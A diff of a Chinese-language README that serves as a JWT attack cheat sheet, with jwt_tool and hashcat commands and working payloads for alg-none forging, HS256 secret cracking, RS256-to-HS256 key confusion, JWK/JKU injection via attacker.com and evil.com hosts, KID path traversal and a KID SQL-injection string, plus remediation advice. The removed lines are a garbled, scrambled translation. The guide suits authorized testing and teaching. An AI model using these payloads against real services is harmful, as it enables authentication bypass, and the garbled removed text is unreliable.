@@ -1,12 +1,16 @@
-# 🎟️ JWT-Attacks 完整速查表
-
 <!-- language-home-navigation -->
-[🏠 中文首页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)
+[🏠 中文主页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)
 
-[🇹🇷 Türkçe Sürüm](./README.tr.md) • [🇬🇷 Ελληνικά](./README.el.md)
+[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)
+
+[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)
+
+---
 
 
+# 🎟️ JWT 攻击 - 完整备忘单
 
+[🇹🇷 Türkçe Sürüm]（翻译/README.tr.md）
 ```
        ██╗██╗    ██╗████████╗     █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗███████╗
        ██║██║    ██║╚══██╔══╝    ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝██╔════╝
@@ -16,87 +20,81 @@
    ╚════╝  ╚══╝╚══╝    ╚═╝       ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝
              JSON Web Token Exploitation & Security Testing Guide
 ```
-
-<p align="center">
-  <img src="https://img.shields.io/badge/JWT-Attacks-orange?style=for-the-badge" alt="JWT Attacks">
+<p对齐=“中心”>
+  <img src="https://img.shields.io/badge/JWT-Attacks-orange?style=for-the-badge" alt="JWT 攻击">
   <img src="https://img.shields.io/badge/jwt_tool-Automated_Testing-blue?style=for-the-badge" alt="jwt_tool">
-  <img src="https://img.shields.io/badge/Algorithm_Confusion-Key_Attacks-red?style=for-the-badge" alt="Key Attacks">
-  <img src="https://img.shields.io/badge/Web_Security-API_Testing-green?style=for-the-badge" alt="API Testing">
+  <img src="https://img.shields.io/badge/Algorithm_Confusion-Key_Attacks-red?style=for-the-badge" alt="关键攻击">
+  <img src="https://img.shields.io/badge/Web_Security-API_Testing-green?style=for-the-badge" alt="API 测试">
 </p>
 
-<p align="center">
-  <b>🛡️ Comprehensive methodology and practical commands for exploiting JSON Web Token (JWT) vulnerabilities</b>
+<p对齐=“中心”>
+  <b>🛡️利用 JSON Web Token (JWT) 漏洞的全面方法和实用命令</b>
 </p>
 
 ---
 
 ## 📋 目录
 
-- [简介](#-introduction--anatomy-of-a-jwt)
-- [Essential Testing Tools](#-essential-testing-tools)
-- [Vulnerability Matrix & Attack Vectors](#-vulnerability-matrix--attack-vectors)
-  - [1. None Algorithm Flaw (`alg: "none"`)](#1-none-algorithm-flaw-alg-none)
-  - [2. Weak HMAC Secret Cracking (HS256)](#2-weak-hmac-secret-cracking-hs256)
-  - [3. Algorithm Confusion / Key Confusion (RS256 -> HS256)](#3-algorithm-confusion--key-confusion-rs256---hs256)
-  - [4. JWK (JSON Web Key) Header Injection](#4-jwk-json-web-key-header-injection)
-  - [3. Sign the token with your matching private key.](#5-jku-jwk-set-url-misconfiguration--ssrf)
-  - [> - `https://trusted.com@attacker.com/jwks.json`](#6-kid-key-id-header-manipulation--injections)
-  - [Inject a known static string:](#7-cross-service-relaying--sensitive-data-leakage)
-- [Automating Tests with `jwt_tool`](#-automating-tests-with-jwt_tool)
-- [Cracking JWT Secrets with Hashcat](#-cracking-jwt-secrets-with-hashcat)
-- [快速参考](#-quick-reference-table)
-- [Remediation & Secure Implementation](#-remediation--secure-implementation)
-- [Legal Disclaimer](#-legal-disclaimer)
-- [参考资源](#-resources)
+- [JWT 的介绍和剖析](#-introduction--anatomy-of-a-jwt)
+- [基本测试工具](#-essential-testing-tools)
+- [漏洞矩阵和攻击向量](#-vulnerability-matrix--attack-vectors)
+  - [1.无算法缺陷 (`alg: "none"`)](#1-none-algorithm-flaw-alg-none)
+  - [2.弱 HMAC 秘密破解 (HS256)](#2-weak-hmac-secret-cracking-hs256)
+  - [3.算法混乱/密钥混乱(RS256 -> HS256)](#3-algorithm-confusion--key-confusion-rs256---hs256)
+  - [4. JWK（JSON Web 密钥）标头注入](#4-jwk-json-web-key-header-injection)
+  - [5. JKU（JWK 设置 URL）配置错误和 SSRF](#5-jku-jwk-set-url-misconfiguration--ssrf)
+  - [6. KID（密钥 ID）标头操作和注入](#6-kid-key-id-header-manipulation--injections)
+  - [7.跨服务中继&敏感数据泄露](#7-cross-service-relaying--sensitive-data-leakage)
+- [使用 `jwt_tool` 进行自动化测试](#-automating-tests-with-jwt_tool)
+- [使用 Hashcat 破解 JWT 秘密](#-cracking-jwt-secrets-with-hashcat)
+- [快速参考表](#-quick-reference-table)
+- [修复和安全实施](#-remediation--secure-implementation)
+- [法律免责声明](#-legal-disclaimer)
+- [资源](#-资源)
 
 ---
 
-## 🎯 简介
+## 🎯 JWT 的介绍和剖析
 
-A **JSON Web Token (JWT)** is a compact, URL-safe means of representing claims between two parties. Commonly used for session authentication in modern REST APIs, Single Page Applications (SPAs), and microservices.
+**JSON Web 令牌 (JWT)** 是一种紧凑、URL 安全的方式，用于表示两方之间的声明。通常用于现代 REST API、单页应用程序 (SPA) 和微服务中的会话身份验证。
 
-A standard JWT consists of three Base64URL-encoded parts separated by dots (`.`):
-
+标准 JWT 由三个由点分隔的 Base64URL 编码部分 (`.`) 组成：
 ```
 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTYiLCJuYW1lIjoiQWxpY2UiLCJyb2xlIjoidXNlciJ9.4z7kE8l...
 [------------- HEADER -------------].[-------------- PAYLOAD --------------].[----------- SIGNATURE -----------]
 ```
-
-1. **Header:** Identifies the token type and the cryptographic algorithm used (e.g., `HS256`, `RS256`, `none`).
-2. **Payload:** Contains the claims (e.g., `user_id`, `role`, expiration `exp`). *Note: Payloads are encoded, NOT encrypted!*
-A standard JWT consists of three Base64URL-encoded parts separated by dots (`.`):
+1. **标头：** 标识令牌类型和使用的加密算法（例如，`HS256`、`RS256`、`none`）。
+2. **有效负载：** 包含声明（例如，`user_id`、`role`、过期 `exp`）。 *注意：有效负载是编码的，而不是加密的！*
+3. **签名：** 通过使用秘密密钥或私钥对编码的标头和有效负载进行哈希处理而创建。
 
 ---
 
-## 🛠️ Essential Testing Tools
+## 🛠️ 基本测试工具
 
-3. **Signature:** Created by hashing the encoded Header and Payload using a secret key or private key.
-2. **Hashcat:** Fast GPU-based HMAC secret cracking (Mode `16500`).
-3. **Burp Suite Extension:** "JWT Editor" by Fraser Winterborn (in PortSwigger BApp Store).
+1. **jwt_tool：** 用于分析、测试和破解 JWT 的命令行工具包。
+2. **Hashcat：** 基于GPU的快速HMAC秘密破解（模式`16500`）。
+3. **Burp Suite 扩展：** Fraser Winterborn 的“JWT 编辑器”（在 PortSwigger BApp Store 中）。
 
-### 🛠️ Essential Testing Tools
-
+### 安装`jwt_tool`
 ```bash
 git clone https://github.com/ticarpi/jwt_tool
 cd jwt_tool
 python3 -m pip install -r requirements.txt
 alias jwt_tool='python3 /opt/jwt_tool/jwt_tool.py'
 ```
-
 ---
 
-## 💥 Vulnerability Matrix & Attack Vectors
+## 💥 漏洞矩阵和攻击向量
 
-### 1. None Algorithm Flaw (`alg: "none"`)
+### 1. 无算法缺陷 (`alg: "none"`)
 
-**Mechanism:**
-Some JWT verification libraries consider tokens valid if the `alg` header is set to `none`, completely bypassing signature verification.
+**机制：**
+如果 `alg` 标头设置为 `none`，某些 JWT 验证库会认为令牌有效，从而完全绕过签名验证。
 
-**Exploitation:**
-1. None Algorithm Flaw (`alg: "none"`)
-2. Modify payload claims (e.g., `"role": "admin"`).
-Mechanism:
-
+**利用：**
+1、解码头部，将`"alg": "HS256"`改为`"alg": "none"`。
+2. 修改有效负载声明（例如，`"role": "admin"`）。
+3. 删除签名部分（保留尾随点！）。
 ```bash
 # Using jwt_tool to forge 'none' algorithm token
 python3 jwt_tool.py <TOKEN> -X a
@@ -104,20 +102,18 @@ python3 jwt_tool.py <TOKEN> -X a
 # Test various casing variations (none, None, NONE, nOnE)
 python3 jwt_tool.py <TOKEN> -T -S none
 ```
-
-*Manual Token Structure:*
+*手动代币结构：*
 ```text
 eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.
 ```
-
 ---
 
-### 2. Weak HMAC Secret Cracking (HS256)
+### 2.弱HMAC秘密破解（HS256）
 
-**Mechanism:**
-If the server signs tokens using symmetric algorithms (`HS256`, `HS384`, `HS512`) with a guessable or weak secret key (e.g., `secret`, `admin123`, company name), an attacker can brute-force the secret offline and sign arbitrary tokens.
+**机制：**
+如果服务器使用对称算法（`HS256`、`HS384`、`HS512`）以及可猜测或弱密钥（例如，`secret`、`admin123`、公司名称）对令牌进行签名，则攻击者可以离线暴力破解秘密并签署任意令牌。
 
-**Cracking with Hashcat:**
+**用Hashcat破解：**
 ```bash
 # Save the full JWT to a file
 echo "eyJhbGciOi..." > jwt.txt
@@ -125,58 +121,53 @@ echo "eyJhbGciOi..." > jwt.txt
 # Crack using Hashcat Mode 16500 (JWT Secret)
 hashcat -m 16500 -a 0 jwt.txt /usr/share/wordlists/rockyou.txt
 ```
-
-**Forging Token After Cracking:**
+**破解后锻造Token：**
 ```bash
 python3 jwt_tool.py <TOKEN> -T -S hs256 -p 'discovered_secret'
 ```
-
 ---
 
-### 3. Algorithm Confusion / Key Confusion (RS256 -> HS256)
+### 3.算法混乱/密钥混乱（RS256 -> HS256）
 
-**Mechanism:**
-- **RS256 (Asymmetric)**: Signed with the server's private key; verified with the server's **public key**.
-- **HS256 (Symmetric)**: Signed and verified with the **same shared secret**.
+**机制：**
+- **RS256（非对称）：** 使用服务器的私钥签名；使用服务器的**公钥**进行验证。
+- **HS256（对称）：** 使用**相同的共享密钥**进行签名和验证。
 
-3. Algorithm Confusion / Key Confusion (RS256 -> HS256)
-1. Obtain the server's public key (often publicly exposed at `/.well-known/jwks.json` or certificates).
-Mechanism:
-RS256 (Asymmetric)**: Signed with the server's private key; verified with the server's **public key**.
-4. The server receives the token, sees `HS256`, and verifies the signature using its configured verification key (which is its public key), resulting in a valid signature!
+如果后端库没有严格强制算法类型，攻击者可以：
+1. 获取服务器的公钥（通常在 `/.well-known/jwks.json` 或证书上公开）。
+2. 将代币的算法头从 `RS256` 更改为 `HS256`。
+3. 使用服务器的**公钥**作为 HMAC 密钥对修改后的令牌进行签名！
+4. 服务器收到令牌，看到`HS256`，并使用其配置的验证密钥（即其公钥）验证签名，从而得到有效的签名！
 
-**Exploitation via `jwt_tool`:**
+**通过 `jwt_tool` 进行利用：**
 ```bash
 # Supply the server's public key and perform key confusion
 python3 jwt_tool.py <TOKEN> -X k -pk public.pem
 ```
-
 ---
 
-### 4. JWK (JSON Web Key) Header Injection
+### 4. JWK（JSON Web Key）标头注入
 
-**Mechanism:**
-The JWT specification allows an embedded public key in the `jwk` header parameter. Vulnerable servers trust this header key to verify the signature without checking if the key belongs to a trusted CA or pre-shared whitelist.
+**机制：**
+JWT 规范允许在 `jwk` 标头参数中嵌入公钥。易受攻击的服务器信任此标头密钥来验证签名，而不检查该密钥是否属于受信任的 CA 或预共享白名单。
 
-**Exploitation:**
-4. JWK (JSON Web Key) Header Injection
-2. Embed the public key in the `jwk` header.
-Mechanism:
-
+**利用：**
+1. 生成攻击者RSA密钥对。
+2. 将公钥嵌入 `jwk` 标头中。
+3. 使用您匹配的私钥对令牌进行签名。
 ```bash
 # Inject self-signed key in header using jwt_tool
 python3 jwt_tool.py <TOKEN> -X i
 ```
-
 ---
 
-### 3. Sign the token with your matching private key.
+### 5. JKU（JWK 设置 URL）配置错误和 SSRF
 
-**Mechanism:**
-The `jku` (JWK Set URL) header specifies a remote URL from which the server should fetch the public key set to verify the token.
+**机制：**
+`jku`（JWK Set URL）标头指定服务器应从中获取公钥集以验证令牌的远程 URL。
 
-**Exploitation:**
-5. JKU (JWK Set URL) Misconfiguration & SSRF
+**利用：**
+1. 在攻击者 Web 服务器上托管您自己的 `jwks.json`：
    ```json
    {
      "keys": [
@@ -190,7 +181,7 @@ The `jku` (JWK Set URL) header specifies a remote URL from which the server shou
      ]
    }
    ```
-Mechanism:
+2.修改token头：
    ```json
    {
      "alg": "RS256",
@@ -199,22 +190,22 @@ Mechanism:
      "kid": "attacker-key"
    }
    ```
-3. Sign the token with your private key.
+3. 使用您的私钥对令牌进行签名。
 
-> **Bypassing URL Whitelists:**
-> If the application validates domain endings, test open redirects or URL parsing quirks:
-2. Modify the token header:
+> **绕过 URL 白名单：**
+> 如果应用程序验证域名结尾，请测试开放重定向或 URL 解析怪癖：
+> - `https://trusted.com@attacker.com/jwks.json`
 > - `https://trusted.com.attacker.com/jwks.json`
-3. Sign the token with your private key.
+> - 打开重定向：`https://trusted.com/redirect?url=http://attacker.com/jwks.json`
 
 ---
 
-### > - `https://trusted.com@attacker.com/jwks.json`
+### 6. KID（密钥 ID）标头操作和注入
 
-> - Open redirect: `https://trusted.com/redirect?url=http://attacker.com/jwks.json`
+`kid` 标头是一个字符串，用于标识应从数据库或文件系统加载哪个密钥。
 
-#### A. Directory Traversal to Empty File (`/dev/null`)
-If the server reads the key file from disk using `kid`:
+#### A. 目录遍历到空文件（`/dev/null`）
+如果服务器使用`kid`从磁盘读取密钥文件：
 ```json
 {
   "alg": "HS256",
@@ -222,14 +213,14 @@ If the server reads the key file from disk using `kid`:
   "kid": "/dev/null"
 }
 ```
-Sign the token with an empty secret (`""` / 0 bytes)!
+使用空秘密（`""` / 0 字节）对令牌进行签名！
 
-#### B. SQL Injection via KID
-A. Directory Traversal to Empty File (`/dev/null`)
+#### B. 通过 KID 进行 SQL 注入
+如果服务器从数据库获取机密：
 ```sql
 SELECT secret FROM keys WHERE kid = 'INPUT';
 ```
-Inject a known static string:
+注入已知的静态字符串：
 ```json
 {
   "alg": "HS256",
@@ -237,37 +228,33 @@ Inject a known static string:
   "kid": "key' UNION SELECT 'my_known_secret'-- -"
 }
 ```
-Sign the token using the secret `'my_known_secret'`.
+使用秘密 `'my_known_secret'` 签署令牌。
 
 ---
 
-### Inject a known static string:
+### 7. 跨服务中继和敏感数据泄露
 
-- **Unencrypted PII**: Developers frequently store passwords, SSNs, or sensitive user metadata in the payload, forgetting it is only Base64URL-encoded, not encrypted.
-- **Service Confusion**: Using a token meant for a low-privilege service (e.g., analytics API) against an internal administrative API.
+- **未加密的 PII：** 开发人员经常在有效负载中存储密码、SSN 或敏感用户元数据，忘记它只是 Base64URL 编码，而不是加密。
+- **服务混乱：** 针对内部管理 API 使用用于低权限服务（例如分析 API）的令牌。
 
 ---
 
-## ⚡ Automating Tests with `jwt_tool`
+## ⚡ 使用 `jwt_tool` 进行自动化测试
 
-### Service Confusion**: Using a token meant for a low-privilege service (e.g., analytics API) against an internal administrative API.
-The easiest way to scan for all known vulnerabilities automatically:
-
+### 运行所有内置 Playbook 攻击
+自动扫描所有已知漏洞的最简单方法：
 ```bash
 # Launch full automated playbook scan
 python3 jwt_tool.py <TOKEN> -M pb -t https://target.com/api/user -rh "Authorization: Bearer <TOKEN>"
 ```
-
-### Interactive Tampering Mode
+### 交互篡改模式
 ```bash
 # Interactively edit header or payload claims
 python3 jwt_tool.py <TOKEN> -T
 ```
-
 ---
 
-## 🔓 Cracking JWT Secrets with Hashcat
-
+## 🔓 使用 Hashcat 破解 JWT 秘密
 ```bash
 # 1. Format: Put token alone in a file
 echo "eyJhbGciOiJIUzI1NiIsInR5..." > jwt.txt
@@ -278,46 +265,45 @@ hashcat -m 16500 -a 0 jwt.txt /usr/share/wordlists/rockyou.txt -w 3
 # 3. Rule-based attack
 hashcat -m 16500 -a 0 jwt.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
 ```
+---
+
+## 📊 快速参考表
+
+|漏洞|攻击技术|关键有效负载/标志|
+|--------------|------------------|--------------------|
+| **无算法** |设置 `alg: "none"`，剥离签名 | `jwt_tool <TOKEN> -X a` |
+| **弱秘密** | GPU 字典暴力破解 | `hashcat -m 16500 jwt.txt rockyou.txt` |
+| **算法混乱**|将RS256改为HS256，用公钥签名 | `jwt_tool <TOKEN> -X k -pk pub.pem` |
+| **JWK注射液** |在标头中嵌入攻击者公钥 | `jwt_tool <TOKEN> -X i` |
+| **JKU注射** |将`jku`指向外部服务器 | `"jku": "http://evil.com/jwks.json"` |
+| **KID路径遍历**|将 `kid` 指向 `/dev/null` 或已知文件 | `"kid": "/dev/null"`（用`""`签名）|
+| **KID SQLi** |将静态秘密注入 SQL 查询 | `"kid": "' UNION SELECT 'secret'-- -"`|
 
 ---
 
-## 📊 快速参考
+## 🛡️ 修复和安全实施
 
-|Vulnerability|Attack Technique|Key Payload / Flag|
-|---------------|------------------|--------------------|
-|**None Algorithm**|Set `alg: "none"`, strip signature|`jwt_tool <TOKEN> -X a`|
-|**Weak Secret**|GPU dictionary brute-force|`hashcat -m 16500 jwt.txt rockyou.txt`|
-|**Algorithm Confusion**|Change RS256 to HS256, sign with public key|`jwt_tool <TOKEN> -X k -pk pub.pem`|
-|**JWK Injection**|Embed attacker public key in header|`jwt_tool <TOKEN> -X i`|
-|**JKU Injection**|Point `jku` to external server|`"jku": "http://evil.com/jwks.json"`|
-|**KID Path Traversal**|Point `kid` to `/dev/null` or known file|`"kid": "/dev/null"` (Sign with `""`)|
-|**KID SQLi**|Inject static secret into SQL query|`"kid": "' UNION SELECT 'secret'-- -"`|
-
----
-
-## 🛡️ Remediation & Secure Implementation
-
-1. **Explicitly Whitelist Algorithms:**
-   Never allow client-controlled `alg` selection. Hardcode allowed algorithms on the server (e.g., exclusively allow `RS256`).
-2. **Reject `alg: none` Tokens:**
-   Ensure the library strictly rejects unverified or unsigned tokens.
-3. **Use Long, Cryptographically Secure Secrets:**
-   HMAC secrets must be at least 256 bits (32+ random characters) generated by a secure CSPRNG.
-4. **Validate `jku` and `jwk` Headers:**
-Never allow client-controlled `alg` selection. Hardcode allowed algorithms on the server (e.g., exclusively allow `RS256`).
-5. **Sanitize `kid` Values:**
-Ensure the library strictly rejects unverified or unsigned tokens.
+1. **明确的白名单算法：**
+   切勿允许客户端控制的 `alg` 选择。在服务器上硬编码允许的算法（例如，专门允许 `RS256`）。
+2. **拒绝`alg: none`代币：**
+   确保库严格拒绝未经验证或未签名的令牌。
+3. **使用长的、加密安全的秘密：**
+   HMAC 密钥必须至少为 256 位（32+ 随机字符），由安全 CSPRNG 生成。
+4. **验证 `jku` 和 `jwk` 标头：**
+   仅从内部受信任 URL 的严格白名单中获取 JWK 集；拒绝用户提供的外部域。
+5. **清理 `kid` 值：**
+   将`kid`视为不受信任的用户输入；清理目录遍历 (`../`) 和 SQL 注入。
 
 ---
 
-## ⚠️ Legal Disclaimer
+## ⚠️ 法律免责声明
 
-> **IMPORTANT:** JWT attacks can lead to full authentication bypass and unauthorized access to application databases. This guide is strictly intended for educational purposes and authorized penetration testing.
+> **重要：** JWT 攻击可能导致完全身份验证绕过和对应用程序数据库的未经授权的访问。本指南严格用于教育目的和授权渗透测试。
 
 ---
 
-## 📚 参考资源
+## 📚 资源
 
-- [jwt_tool GitHub Repository](https://github.com/ticarpi/jwt_tool)
-- [PortSwigger Web Security Academy: JWT Attacks](https://portswigger.net/web-security/jwt)
-- [RFC 7519 - JSON Web Token (JWT) Standard](https://datatracker.ietf.org/doc/html/rfc7519)
+- [jwt_tool GitHub 存储库](https://github.com/ticarpi/jwt_tool)
+- [PortSwigger Web 安全学院：JWT 攻击](https://portswigger.net/web-security/jwt)
+- [RFC 7519 - JSON Web 令牌 (JWT) 标准](https://datatracker.ietf.org/doc/html/rfc7519)
